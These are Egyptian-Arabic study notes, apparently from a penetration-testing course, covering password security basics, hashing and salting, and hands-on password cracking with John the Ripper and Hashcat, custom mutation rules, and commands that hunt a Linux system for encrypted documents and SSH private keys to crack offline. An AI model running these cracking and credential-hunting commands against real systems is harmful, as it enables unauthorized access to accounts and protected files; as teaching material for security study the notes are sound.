# Layer 1

- النص بيقول إن في تلات حاجات أساسية في أمن المعلومات: **Confidentiality (السرية)**، **Integrity (السلامة/عدم التلاعب)**، و**Availability (التوافر)**. دول مع بعض بيشكلوا اللي بنسميه مثلث الـCIA.
    
    - السرية = إن المعلومات متتوفرش للناس اللي ملهمش حق يشوفوها. (Encryption)
        
    - السلامة = إن البيانات متتغيرش ولا حد يعبث بيها من غير ما نكتشف. (Hash)
        
    - التوافر = إن النظام والمعلومات موجودين وبيشتغلوا لما نحتاجهم. (redundancy)
        
- لو أي حاجة من التلاتة دي اتكسرت، بنبقى معرضين لاختراقات ومشاكل كبيرة. علشان نحافظ على التوازن ده، بنحتاج نعمل auditing (تتبع وتسجيل كل حاجة بتحصل على الملفات والـhosts) وaccounting، وكمان نتاكد إن الناس عندها الصلاحيات المناسبة (authorization) وبعد ما نتحقق من هويتهم (authentication).
    
- النص بيأكد إن معظم الاختراقات بترجع لفشل واحد من دول —  هنا هيركز على كلمة **authentication** (التحقق من الهوية) خصوصًا عن طريق كلمات السر. يعني: لو حد قدر يكسر الـauthentication، غالبًا هيوصل لموارد مش مسموح له بيها.
    

Authentication — تعريفه وعوامله (4 عوامل)

- Authentication =
- التحقق إن الشخص اللي بيحاول يدخل هو فعلاً الشخص اللي مفروض يدخل. ده بيتعمل عن طريق حاجة أو مجموعة حاجات بنسميهم عوامل authentication. النص عدّهم 4 عوامل:
    
    1. **Something you know** — حاجات بتعرفها: password, PIN, passphrase. (مثال: كلمة سر حساب البريد).
        
    2. **Something you have** — حاجات معاك: ID card، smart card، الموبايل اللي عليه تطبيق المصادقة (authenticator app)، أو توكن فيزيائي.
        
    3. **Something you are** — حاجات بتعبر عنك جسديًا: بصمة، وش، عيون (iris)، صوت. ده الـbiometrics.
        
    4. **Somewhere you are** —
 المكان اللي إنت فيه: موقعك الجغرافي، أو الـIP اللي جاي منه الطلب.
        
- الأنظمة ممكن تطلب واحد، اتنين، أو كل العوامل حسب حساسية المعلومات. مثال عملي من النص: الدكاترة ممكن محتاجين CAC (بطاقة) + PIN أو password، يعني حاجة معاك + حاجة تعرفها. ودي اسمها **multi-factor authentication** (MFA).
    

Authentication vs Authorization — فرق مهم

- Authentication = التأكد من الهوية (مين إنت؟).
    
- Authorization = التأكد من الـpermissions بعد ما الهوية اتحققت (إذن إيه اللي مسموح ليك تعمله؟).
    
- مثال: لو دخلت على إيميلك بكلمة السر الصح — ده authentication ناجح. بعد كده النظام يديك صلاحيات معينة (مثلاً: تقدر تبعت أو تقرأ بس) — دي authorization.
    

استخدام كلمات السر (The use of passwords) — إيه هي كلمة السر أصلاً وإزاي الناس بتستخدمها

- كلمة السر عبارة عن سلسلة أحرف (حروف، أرقام، رموز) أو عبارة طويلة (passphrase). ممكن تكون كلمة من أغنية، بيت شعر، أو عبارة متذكِّرة زي "TreeDogEvilElephant".
    
- مثال رياضي بسيط في النص: لو عندك password طوله 8 وبيحتوي على حروف كبيرة وأرقام بس (36 حرف ممكن) يبقى مجموع التركيبات = 36^8 ≈ 208,827,064,576 احتمال — لكن ده حساب نظري: الإنسان مش هيختار كل الاحتمالات دي بشكل عشوائي.
    
- النص بيتكلم كمان عن التوازن بين الأمان والراحة: كلما النظام بيبقى معقَّد أكتر في المصادقة، كلما بيبقى أأمن، لكنه بيبقى مزعج للمستخدم (UX) — ودايماً فيه trade-off. مثال: لو موقع تسوق، طالما فيه تسجيل وحفظ بيانات بتسهل عليك الدفع، الناس هتفضل تستخدمه بدل ما تدخل بيانات في كل مرة.
    

إحصائيات وتوجهات عن كلمات السر (من دراستين مذكورتين)

- في دراسة Google + Harris Poll سنة 2019: نسبة كبيرة من الناس استخدمت كلمات سر ضعيفة زي "123456"، "qwerty"، "password". برضه نسبة الناس اللي كانوا بيستخدموا password managers كانت قليلة (15% وقتها). reuse (إعادة استخدام نفس الباسوورد) كان عنده 66% — يعني لو حصل تسريب لباسوورد واحد، غالبًا تقدر تستخدمه على منصات تانية للمستخدم نفسه.
    
- إحصائيات Panda Security سنة 2025 بتقول إن الأمور اتحسنت شوية: "123456" لسه شائع، وناس كتير بتستخدم password reuse عبر 3 حسابات أو أكتر، لكن نسبة استخدام password managers ارتفعت (مثلاً 36% أمريكان).
    
- حاجة مهمة: نسبة الناس اللي بعد ما حصل breach يغيروا الباسوورد بتاعتهم ضعيفة — في المثال، 45% بس غيروا الباسوورد بعد breach، يعني 55% فضلوا على نفس الباسوورد حتى بعد التسريب — ودي كارثة لأن الباسوورد ممكن يبقى متاح للهاكرز.
    

HaveIBeenPwned — أداة مهمة للتحقق

- النص بيقول لو عايز تعرف إيميلك اتسرب في breaches ولا لأ، في موقع اسمه Darkentry
- : بتحط الإيميل وهو يوريك لو الإيميل ده ظهر في أي تقرير تسريبات معروف. مفيد جدًا علشان تتابع لو الباسوورد بتاعك اتسرب ولا لأ.
    

"Digging in" — التحوّل لموضوع تخزين الباسوردات

- النص قرب يدخل في جزء تاني: إزاي بنخزن الباسوردات وcredentials — يعني مش بس إزاي الناس بتختار باسووردات، لكن إزاي السيرفرات بتتعامل معاها: هاش، سالت، تشفير، إلخ. (النص بيوصل لهدلوقتي عشان يكمل).
    

دلوقتي هفصّل شوية نقاط مُهمة جدًا، علشان يكون الشرح شامل ومش بستبعد نقطة:

إزاي كلمات السر بتتخزن وآليات الحماية على السيرفر (مهم ومختصر)

- _ممنوع_ تخزين الباسوردات بنصها (plaintext) — لو اتسرقت الداتا هتطلع الباسوردات كده.
    
- الطريقة الصحيحة: **هَش (Hashing)** — بتاخد الباسوورد وتعملله تحويل رياضي مرة واحدة (مثال شائع: bcrypt, Argon2, scrypt). الـhash بيطلع string ثابت الطول، ومش ممكن ترجعه بسهولة للباسوورد الأصلي.
    
- _Salt_ =
- قيمة عشوائية بتتلزق لكل باسوورد قبل الهاش علشان تمنع هجمات الـrainbow tables (الجداول اللي بتساعد تفك الـhash بسرعة). كل user ممكن يكون عنده salt مختلف محفوظ جنب الhash.
    
- _Pepper_ = قيمة سرية موجودة على السيرفر مش محفوظة في قاعدة البيانات عادة، بتستخدم كطبقة إضافية.
    
- _Hashing 
- متعدد المرات_ و خوارزميات محسوبة (costly) زي bcrypt/argon2 بتبطئ محاولة تخمين الباسورد عن طريق هجمات brute force.
    

أنواع الهجمات على كلمات السر (overview بس، مش تعليم للاختراق)

- **Brute-force**:
- نجرب كل التوليفات لحد ما نلاقي الباسوورد. كل ما الباسوورد أطول ومعقد أكتر، كل ما الوقت المطلوب يزيد.
    
- **Dictionary attacks**:
- بنجرب كلمات من قاموس مش كلمات عشوائية. الناس كتير بتستخدم كلمات شائعة.
    
- **Credential stuffing**: 
- لما بتسرق داتا من موقع A (بها username+password) وتستخدمها على مواقع تانية لأن الناس بتعيد استخدام نفس الباسوورد. ده أخطر حاجة في الواقع.
    
- **Phishing**:
- خداع المستخدم علشان يدخل باسوورده في صفحة مزيفة.
    
- **Keylogging / Malware**: 
- البرامج الخبيثة بتسجل اللي بيتكتب على الكيبورد.
    
- **Social engineering**:
- تخلي الشخص يعطيك الباسوورد بكلام سلس.
    
- **Offline cracking**: 
- لو المخزن (DB) اتسرق وفيه الhashes، الهاكرز يشتغلوا offline على تفكيكهم باستخدام GPU أو خدمات سحابية — هنا أهمية خوارزميات الhash القوية والسالت.
    

خلاصة سريعة ومفيدة (نقاط للقِراءة السريعة)

1. الـCIA triad مهم — واحنا هنا مركزين على Authentication.
    
2. Authentication عواملها: حاجة بتعرفها، حاجة معاك، حاجة أنت، ومكانك. كل ما العوامل أكتر، الأمان أعلى.
    
3. الباسورد لسه الطريقة الأشهر لكن فيها مشاكل كبيرة (reuse، كلمات سهلة).
    
4. خزّن الباسوردات بطريقة آمنة (hash + salt + خوارزميات قوية).
    
5. استعمل MFA وpassword managers وسياسات قوية، وغيّر الباسوورد بعد أي breach.
    
6. راقب وقيّد محاولات الدخول واتحقق من مصادر الدخول (IP، جهاز).
    
7. أدوات زي HaveIBeenPwned مفيدة علشان تعرف لو إيميلك اتسرق قبل كده.

# Layer 2
مقدمة قصيرة — ليه بنعمل hashing للكلمات السرية؟

- لما بنخزن كلمات السر على سيرفر، ما بنخزنهاش **نصها صريح** (plaintext) عشان لو الداتا اتسربت يبقى همه يعرفوا الباسوردات. علشان كده بنعمل **hash**.
    
- الـ**hash** دالة رياضية بتحول أي بيانات (طولها أي قد إيه) لسلسلة مخرجات بطول ثابت تقريبًا. أمثلة شائعة: **MD5** و**SHA-256**.
    

أمثلة عملية من النص (عشان توضح الفكرة)

- لو عندك الباسورد `Soccer06!`، تقدر تولد ال-hash بالطريقة دي (ده في لينكس):
    ![[Pasted image 20251110145543.png]]
    
- النقطة: ال-hash نتيجة ثابتة لأي نص مدخل، ولو غيرت حرف واحد في الباسورد، ال-hash يتغير تمامًا.
    

الغرض من الـhash: "one-way"

- الـhash معمول بحيث **صعب جدًا** أو شبه مستحيل ترجّع منه الباسورد الأصلي — بنسمي ده _one-way function_. عشان كده لما المهاجم بيحاول يعرف الباسورد من ال-hash بنسميها **password cracking**.
    

أنواع هجمات على ال-hash (من النص)

1. Rainbow tables
    

- دي جداول كبيرة مُسبقة التجهيز فيها مقارنات بين مدخلات (كلمات) والـoutput بتاع ال-hash لنفس الخوارزمية (مثلاً MD5). لو ال-hash اللي معاك موجود في الجدول، تقدر تلاقي الباسورد بسرعة من غير ما تجرب كل الاحتمالات دلوقتي.
    
![[Pasted image 20251110145648.png]]

- عشان كده الـrainbow tables قوية جدًا ضد الـhashs العادية.
    

2. Salting —
3. إزاي بنكسر فاعلية الـrainbow tables
    

- **Salt**
- هو قيمة عشوائية بنضيفها للباكورد قبل ما نعمل له hash. مثلاً لو ضفت `Th1sIsTh3S@lt_` قبل `Soccer06!`، واللي اتهاش بـMD5 حيكون حاجة مختلفة تمامًا (`90a10b...` في المثال).
    
- الـsalt مش سر — النظام لازم يعرفه عشان لما حد يدخل الباسوورد يقدر يحسب `salt + password` ويتحقق. عادةً الـsalt بيتخزن جنب ال-hash.
    
- ليه ده بيشتغل ضد rainbow tables؟ لأن الجداول دي معمولة على كلمات من غير salts. لو كل باسوورد له salt مختلف، يبقى المهاجم محتاج يولّد جدول لكل salt ممكن — وده غير عملي لأن عدد الـsalts يزيد الحجم بطريقة رهيبة (مثال من النص: زيادة عامل 256 لو الـsalt بايت واحد).
    
- خلاصة: **salting يقلل فاعلية الـrainbow tables**.
    

3. Brute-force attack
    

- الفكرة البسيطة: نجرب كل الإمكانيات لحد ما نلاقي الباسوورد. مضمون النجاح (لو مافيش حد يوقفك) لكن بياخد وقت كبير جدًا لو الباسوورد طويل أو معقّد.
    
- النص بيقول: كلمات أقصر من ~9 حروف ممكن تتكسر على هاردوير عادي. لكن كل ما الطول والتعقيد يزيدوا، مافيش فرصة عملية على هاردوير بسيط.
    
- Brute-force 
- سرعة التخمين فيها بتعتمد على الـhash algorithm والـhardware: MD5 سهل وسريع، خوارزميات مصممة للأمان (زي bcrypt/argon2) أبطأ ومقاومة أكتر. مثال من النص: على لابتوب ممكن hashcat يخمن ملايين كلمات في الثانية ضد MD5، لكن آلاف بس ضد خوارزمية أبطأ (DCC2 مثال في النص).
    
- ملاحظة من النص: غالبًا بنستبدل brute-force بأنواع أذكى زي **mask attacks** علشان أسرع.
    

4. Dictionary attack (wordlist attack)
    

- بدل ما تجرب كل الاحتمالات، بنستخدم "قاموس" متوقع للكلمات اللي الناس بتستخدمها فعلاً: أسماء شائعة، كلمات بسيطة، تراكيب متكررة. ده أسرع بكتير لو الباسورد بتاع الضحية مشتق من كلمات حقيقية.
    
- أمثلة شهيرة للـwordlists: **rockyou.txt** وSecLists. rockyou.txt فيه ~14 مليون باسوورد حقيقي اتسربوا لما RockYou اتعرضت للاختراق سنة 2009 — الشركة وقتها كانت مخزنة الباسوردات **نصها صريح** وبالتالي اتسربت كلها.
    
- النص عرض أول 20 سطر من rockyou.txt: `123456`, `password`, `iloveyou`, ... ودي بتوضح قد إيه الناس بتستخدم باسووردات ضعيفة أو متوقعة.
    

نقطة مهمة عن rockyou.txt

- rockyou.txt
- عبارة عن لستة حصلت من تسريب حقيقي، وعلشان كده فعّالة جدًا في هجمات dictionary لأن الناس فعلاً بتستخدم نفس الباسوردات اللي اتسربت قبل كده. النص ذكر إن الشركة خزينت الباسوردات غير مشفرة — وده كان سبب التسريب الهائل.
    

خلاصة مُقتضبة ومطابقة للنص

- بنخزن كلمات السر على هيئة hashes مش نص صريح.
    
- الهجمات على ال-hash بتشمل: rainbow tables (جداول مُسبقة)، brute-force (تجربة كل الاحتمالات)، وdictionary attacks (قوائم كلمات متوقعة).
    
- الـsalt مهم جدًا عشان يمنع الـrainbow tables ويزود تعقيد الهجوم.
    
- السرعة اللي تقدر تكسر بيها بستند على الخوارزمية (MD5 سريع، خوارزميات أقوى بطيئة) وعلى الهاردوير.
    
- rockyou.txt مثال عملي لقائمة كلمات اتسربت وبتستخدمها أدوات الاختبار والهاكرز علشان يخترقوا كلمات سر ضعيفة.

# Layer 3

---

## 🧩 مقدمة عن John the Ripper

**John the Ripper (JtR)** 
هي أداة مفتوحة المصدر بتستخدم في **كسر الباسوردات** عن طريق هجمات زي:

- **Brute-force** (تجربة كل الاحتمالات)
    
- **Dictionary attack** (تجربة كلمات من قائمة أو wordlist)
    

اتعملت في الأساس للـ **UNIX systems** سنة 1996، وبقت مشهورة جدًا عشان:

- سرعتها العالية.
    
- دعمها لأنظمة وتنسيقات مختلفة للباسوردات.
    
- النسخة الأفضل للاستخدام اسمها **"Jumbo John"** — دي فيها مميزات أكتر زي دعم للغات مختلفة وسرعة أعلى.
    

---

## أوضاع الكسر (Cracking Modes)

### 1️ Single Crack Mode

ده **بيستخدم معلومات المستخدم نفسه** لتخمين الباسورد.  
يعني مثلاً لو عندك ملف فيه بيانات المستخدم زي:

```
r0lf:$6$ues25dIanlctrWxg$....:/home/r0lf:/bin/bash
```

فـ John هيجرب كلمات زي:

- `rolf`
    
- `Rolf123`
    
- `Sebastian1`
    
- `r0lf2024`
    

وبيعمل ده تلقائي باستخدام قواعد (rules) بتبدّل الحروف أو تضيف أرقام وحروف.

🔹 مثال الأمر:

```bash
john --single passwd
```

---

### 2️⃣ Wordlist Mode

ده اسمه **هجوم القاموس (Dictionary Attack)**،  
يعني بيجرب كل كلمة موجودة في ملف wordlist على الهاش.

🔹 الصيغة:

```bash
john --wordlist=<wordlist_file> <hash_file>
```

🔹 تقدر تستخدم قواعد تعديلات بالكلمات (rules) زي:

- إضافة رقم في الآخر (`password1`)
    
- تغيير الحروف الكبيرة (`Password`)
    
- إضافة رموز (`Password@`)
    

مثلاً:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt
```

---

### 3️⃣ Incremental Mode

ده هو **أقوى وأبطأ نوع** — بيجرب كل الاحتمالات الممكنة زي brute force  
بس بطريقة ذكية باستخدام **Markov chains** (يعني بيتعلم احتمالات الحروف بناءً على الإحصائيات).

🔹 الأمر:

```bash
john --incremental hash_file
```

🔹 ممكن تحدد المجموعة المستخدمة من الحروف من خلال إعدادات في الملف:

```bash
/etc/john/john.conf
```

🔹 ودي فيها إعدادات زي:

- [Incremental:ASCII] ← للحروف والرموز الإنجليزية.
    
- [Incremental:UTF8] ← لكل الرموز تقريبًا.
    

بس خلي بالك ⚠️  
الـ incremental mode بياخد **وقت طويل جدًا** خصوصًا لو الباسورد كبير.

---

##  التعرف على نوع الهاش (Identifying Hash Formats)

أوقات بيجيلك **هاش مش معروف نوعه**، مثلاً:

```
193069ceb0461e1d40d216e32c79c704
```

ومش معروف هل ده **MD5** ولا **SHA1** ولا غيره.

🔹 الحل:  
تستخدم أداة **hashid**:

```bash
hashid -j 193069ceb0461e1d40d216e32c79c704
```

هتديك احتمالات زي:

- MD5 → `raw-md5`
    
- NTLM → `nt`
    
- RIPEMD-128 → `ripemd-128`
    

وبعد كده تختار الـ format في الأمر:

```bash
john --format=raw-md5 hash.txt
```

---

##  أمثلة لأنواع الهاشات اللي بيدعمها JtR

| Format        | Example Command                    | Description         |
| ------------- | ---------------------------------- | ------------------- |
| `raw-md5`     | john --format=raw-md5 hash.txt     | هاشات MD5 العادية   |
| `nt`          | john --format=nt hash.txt          | هاشات Windows NT    |
| `sha512crypt` | john --format=sha512crypt hash.txt | هاشات لينكس الحديثة |
| `zip`         | john --format=zip hash.txt         | ملفات ZIP المحمية   |
| `rar`         | john --format=rar hash.txt         | ملفات RAR المحمية   |
| `pdf`         | john --format=pdf hash.txt         | ملفات PDF المحمية   |

في مئات الأنواع التانية، وكل واحدة ليها `--format` خاص بيها.

---

##  تكسير ملفات محمية (Cracking Files)

John مش بس بيكسر باسوردات مستخدمين،  
كمان بيكسر **ملفات محمية بكلمة سر** زي:

- ZIP
    
- RAR
    
- PDF
    
- SSH keys
    
- Office files
    
- KeePass databases
    

بس قبل التكسير لازم **تحوّل الملف إلى hash قابل للقراءة بواسطة John**  
وده بيتم باستخدام أدوات اسمها `2john` tools.

🔹 الشكل العام:

```bash
<tool> <file> > file.hash
john file.hash
```

🔹 أمثلة:

|Tool|Description|
|---|---|
|pdf2john|يحول ملفات PDF|
|rar2john|يحول ملفات RAR|
|zip2john|يحول ملفات ZIP|
|ssh2john|يحول مفاتيح SSH|
|office2john|يحول ملفات Word و Excel|
|keepass2john|يحول قواعد بيانات KeePass|

🔹 مثال عملي:

```bash
zip2john secret.zip > secret.hash
john --wordlist=rockyou.txt secret.hash
```

---

##  خلاصة سريعة

|الوضع|الاستخدام|المميزات|العيوب|
|---|---|---|---|
|Single Crack|باستخدام بيانات المستخدم|سريع – مفيد في لينكس|محدود الاستخدام|
|Wordlist|قائمة كلمات|سهل وسريع لو عندك wordlist قوية|فاشل لو الباسورد غير شائع|
|Incremental|brute force ذكي|ممكن يجيب أي باسورد|بطييئ جدًا|
|Cracking Files|للملفات المحمية|يدعم تنسيقات كتير|محتاج تحويل أول|

---

# Layer 4
---

## **يعني إيه Hashcat؟**

هو Tool (أداة) مشهورة بتستخدمها علشان **تفك أو تكسر الهاشات (hashes)** اللي فيها كلمات سر مش معروفة.  
تشتغل على **Linux و Windows و macOS**، وكانت مدفوعة زمان بس بقت **open-source** من 2015.  
ميزتها الكبيرة إنها **بتستخدم كارت الشاشة (GPU)**، فبتشتغل بسرعة رهيبة في تجربة كلمات السر.

---

## ⚙️ **الأمر الأساسي لتشغيل Hashcat**

```bash
hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
```

شرح:

- `-a` → نوع الهجوم (Attack Mode)
    
- `-m` → نوع الهاش (Hash Type)
    
- `<hashes>` → الهاش أو الملف اللي فيه الهاشات
    
- `[wordlist, rule, mask, ...]` → باقي الحاجات حسب نوع الهجوم
    

---

## 🔐 **أنواع الهاشات (Hash Types)**

كل نوع هاش له رقم (ID).  
مثلاً:

- `0` → MD5
    
- `100` → SHA1
    
- `1400` → SHA2-256
    
- `1700` → SHA2-512  
    وهكذا...
    

تقدر تشوف كل الأنواع بالأمر:

```bash
hashcat --help
```

ولو عايز تعرف نوع هاش معين:

```bash
hashid -m '<hash>'
```

مثلاً:

```bash
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
```

هتقولك مثلاً ده:

> [+] MD5 Crypt [Hashcat Mode: 500]

---

## 💣 **أنواع الهجمات (Attack Modes)**

Hashcat عنده كذا نوع من الهجمات، بس الأشهر هما:

### 1️⃣ Dictionary Attack (هجوم القاموس)

رمزه: `-a 0`  
يعني بتجرب كلمات السر من ملف (wordlist) واحدة واحدة.

مثلاً لو عندك هاش:

```
e3e3ec5831ad5e7288241960e5d4fdb8
```

وعايز تجربه بكلمة سر من `rockyou.txt`:

```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
```

لو لقى كلمة السر، هتظهر في النتيجة كـ:

> Status: Cracked ✅

---

### 🔁 استخدام **Rules (القواعد)** لتعديل الكلمات

أوقات الـ wordlist لوحدها مش كفاية.  
تقدر تضيف Rule file يعمل تعديلات زي:

- يبدل الحروف بأرقام (leet speak)
    
- يضيف أرقام في الآخر
    
- يغير الحروف الكبيرة والصغيرة
    

مثلاً:

```bash
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

الـ `-r` معناها استخدم rule معين.

قائمة الـ rules موجودة هنا:

```bash
ls /usr/share/hashcat/rules
```

أشهرها:

- `best64.rule`
    
- `rockyou-30000.rule`
    
- `d3ad0ne.rule`
    

---

### 2️⃣ Mask Attack (Brute Force موجه)

رمزه: `-a 3`

هو هجوم بتحدد فيه شكل الباسورد اللي عايز تجربه بدل ما يجرب كل الاحتمالات في الدنيا.

![[Pasted image 20251110153728.png]]

مثلاً:  
لو عارف إن الباسورد:

- بيبدأ بحرف كابيتال
    
- بعده 4 حروف صغيرة
    
- بعدهم رقم
    
- وبعدهم رمز
    

يبقى الماسك بتاعك:

```
?u?l?l?l?l?d?s
```

وتشغله كده:

```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```



---

## 🔤 الرموز المستخدمة في الماسك

|الرمز|المقصود بيه|
|---|---|
|`?l`|حروف صغيرة|
|`?u`|حروف كبيرة|
|`?d`|أرقام|
|`?s`|رموز|
|`?a`|كل حاجة (حروف + أرقام + رموز)|
|`?b`|كل البايتات (0x00 - 0xff)|

وتقدر تعمل charset خاص بيك:

```bash
hashcat -a 3 -m 0 -1 ?l?d hash '?1?1?1?1?1'
```

(ده بيجرب أي 5 حروف أو أرقام)

---

## 🧠 خلاصة سريعة:

|العنصر|معناها|
|---|---|
|`-a 0`|Dictionary attack|
|`-a 3`|Mask attack|
|`-m 0`|نوع الهاش (هنا MD5)|
|`-r`|استخدم rule لتعديل الكلمات|
|`?l, ?u, ?d, ?s`|الحروف/الأرقام/الرموز في الماسك|

---
الرسالة اللي بتظهر دي 

```
INFO: All hashes found as potfile and/or empty entries! Use --show to display them.
```

مش معناها إن في مشكلة فعلًا — هي بتقولك إن الـ **hash اللي بتحاول تكسره موجود أصلًا في ملف النتائج (`potfile`)**، يعني Hashcat فعلاً **كسره قبل كده** و حفظ النتيجة، فمفيش داعي يعيد الكسر.



###  معنى الرسالة

- Hashcat لما بيكسر Hash، بيحفظ النتيجة (الـ hash والـ password المقابل ليه) في ملف اسمه:
    
    ```
    ~/.hashcat/hashcat.potfile
    ```
    
- فلو جيت بعد كده تشغل نفس الـ hash تاني، هيقولك:
    
    > "All hashes found as potfile"  
    > يعني كله متكسر وموجود.
    

---

###  الحلول حسب اللي انت عايزه:

####  لو عايز تشوف الباسورد اللي كان متكسر:

شغّل الأمر ده:

```bash
hashcat --show -m 0 e3e3ec5831ad5e7288241960e5d4fdb8
```

ده هيعرضلك الـ hash والباسورد اللي ليه من ملف الـ potfile.

---

####  لو عايز تعيد الكسر من الأول (كأنك أول مرة):

احذف الـ potfile أو تجاهله كالتالي:

1. إما تمسح الملف:
    
    ```bash
    rm ~/.hashcat/hashcat.potfile
    ```
    
2. أو تتجاهله مؤقتًا باستخدام:
    
    ```bash
    hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --potfile-disable
    ```
    

---


# Layer 5

الجزء دا بيتكلم عن **إزاي تعمل Wordlists و Rules مخصصة بنفسك** في Hashcat علشان تزود فرصك في كسر الباسوردات الصعبة — خصوصًا اللي معمولة على أساس تفكير بشري مش عشوائي.  
تعالى نلخصه بالعربي المصري خطوة بخطوة:

---

### 🧠 الفكرة العامة

الناس غالبًا بتحط باسوردات بسيطة أو متوقعة، زي:

- **Password123**
    
- **Mohamed2024!**
    
- **Football98**
    

حتى لو السيستم بيجبرهم على حروف كابيتال وأرقام وسيمبولز، بيختاروا أبسط شكل ممكن يحقق الشروط دي.

فالمهاجم الذكي (أو الباحث الأمني 😏) بيستغل المعلومة دي ويكوّن **قوائم كلمات (Wordlists)** و **قواعد تعديل (Rules)** مبنية على منطق الناس في اختيار الباسورد.

---

### 🧱 بناء Wordlists مخصصة

#### مثال بسيط:

عندك ملف فيه كلمة واحدة:

```bash
cat password.list
password
```

وعايز تعمل منها أشكال تانية زي:

- Password
    
- P@ssword
    
- P@ssword!
    
- passw0rd  
    وهكذا.
    

---

### ⚙️ بناء Rules

Hashcat 
بيستخدم Syntax بسيط علشان يطبق تعديلات على الكلمات دي، زي:

|الرمز|الوظيفة|
|---|---|
|`:`|مفيش تعديل|
|`l`|يخلي كل الحروف small|
|`u`|يخليها كلها capital|
|`c`|أول حرف capital والباقي small|
|`sXY`|يبدّل كل X بـ Y (زي s@ يحول a لـ @)|
|`$!`|يضيف ! في الآخر|

#### مثال على ملف rule:

```bash
cat custom.rule
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

كل سطر هنا بيمثل قاعدة معينة بيتطبق بيها تعديل على الكلمة الأصلية.

---

### 🧩 تطبيق القواعد على الكلمات:

بتكتب أمر زي كده:

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

ده بياخد الكلمة اللي في `password.list` ويطبّق عليها كل القواعد اللي في `custom.rule`، ويخزن الناتج في ملف جديد اسمه `mut_password.list`.

النتيجة:

```
password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

    


---
# Layer 6
## فكرة عامة — ليه بنكسر ملفات محمية؟

بعض الناس والشركات بيبقوا بقى بيشفّروا ملفات (Excel, Word, PDF, archives, SSH keys, وغيره) عشان يحافظوا على سرية البيانات. ده صح وضروري (مثلاً GDPR في أوروبا بيطلب تشفير البيانات في النقل وفي التخزين). لكن لو حد لقى ملف مشفر على جهاز أو على سيرفر، ومحتاج يحلل النظام (pentest أو post-exploitation)، غالبًا هيحاول **يستخرج الهاش أو الـblob** اللي مرتبط بالملف وبعدين يحاول يكسره offline باستخدام أدوات زي John / Hashcat.

---

## تشفير ملفات: أنواع عامة وفكرة العمل

- **Symmetric encryption (مثل AES-256)**: 
- نفس المفتاح بيُستخدم للتشفير والفك. غالبًا الناس بتحط  كلمة سر لملف ZIP أو ملف Office، والمفتاح مشتق من الباسورد.
    
- **Asymmetric encryption**: 
- فيه مفتاح عام ومفتاح خاص؛ المرسل يشفر بالمفتاح العام واللي معاه المفتاح الخاص يقدر يفك. المستخدمين عادة بيستخدموا ده لإرسال بيانات مش لتخزين ملف محلي (exceptions موجودة).
    
- لما الملف محمي بكلمة سر، بتقدر تستخرج تمثيل (hash / KDF output) من الملف (بأدوات زي pdf2john, office2john, zip2john, rar2john, ssh2john...) وبعدين تشغّل أدوات كراكينج على الهاش offline.
    

---

## ازاي تدور على ملفات مشفرة على نظام لينكس (hunting)

أمثلة أوامر عملية:

1. دور على امتدادات ملفات Office / PDF / archives:
    

```shell

0xTroj6n@htb[/htb]$
 for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .xls

File extension:  .xls*

File extension:  .xltx

File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
...SNIP...
``````
- هتلاقي ملفات `.odt`, `.ods`, `.docx`, `.pdf` وهكذا.
    

2. لو مش متأكد عن امتداد، دور على ملفات حسب المحتوى:  
    مثال: دور على مفاتيح SSH (بيبدأوا بـ `-----BEGIN ... PRIVATE KEY-----`):
    

`grep -rnE '^\-{5}BEGIN [A-Z0-9 ]+ PRIVATE KEY\-{5}$' / 2>/dev/null`

![[Pasted image 20251110165652.png]]

- هيلاقيلك id_rsa, id_ed25519, ملفات private keys في أماكن غير متوقعة.
    

3. لو عايز تستبعد مسارات ضخمة (مثل /usr/share) ضيف `-path` أو `grep -v` زي المثال.
    

---

## ازاي تعرف إذا الـSSH key مؤمن بـ passphrase ولا لأ

- بعض الـPEM القديمة كان فيها header يوضح `Proc-Type: 4,ENCRYPTED` و `DEK-Info: ...` — لو موجودين يبقى الملف مؤمن بكلمة سر.
    ![[Pasted image 20251110165819.png]]
    
- لكن المفاتيح الحديثة (OpenSSH new format) مش بيوضحوا دايماً في الهيدر. أسهل طريقة عملية:
    
![[Pasted image 20251110165832.png]]

- لو ظهر لك طلب `Enter passphrase for "...":` يبقى المفتاح مؤمن.

![[Pasted image 20251110165850.png]]


---

## ازاي نطلع الهاش من الملف علشان نكسر الباسورد (tools)

John و Hashcat جوهّهم سكريبتات بتحول ملفات محمية لصيغة قابلة للكسر:

- **ssh2john.py** →
- يحول SSH private key لمخرجات قابلة للـJohn.
    
- **office2john.py** → يحول ملفات MS Office المحمية (docx, xlsx, ...) إلى hash.
    
- **pdf2john.py** → يحول PDF المحمي إلى hash.
    
- **zip2john / rar2john / 7z2john / keepass2john / ...** → تحويل صيغ تانية.
    

مثال عملي:

![[Pasted image 20251110165954.png]]

أو لملف Office:

![[Pasted image 20251110170051.png]]

أو PDF:

![[Pasted image 20251110170121.png]]

الـworkflow دا مهم: **تحويل → كراك offline → استخرج الباسورد**.

---

## ملاحظات عملية عن أنواع الـhash ونجاح الكراك

- مدى سهولة كسر الملف مربوط بـ:
    
    1. قوة كلمة المرور (طولها وتعقيدها).
        
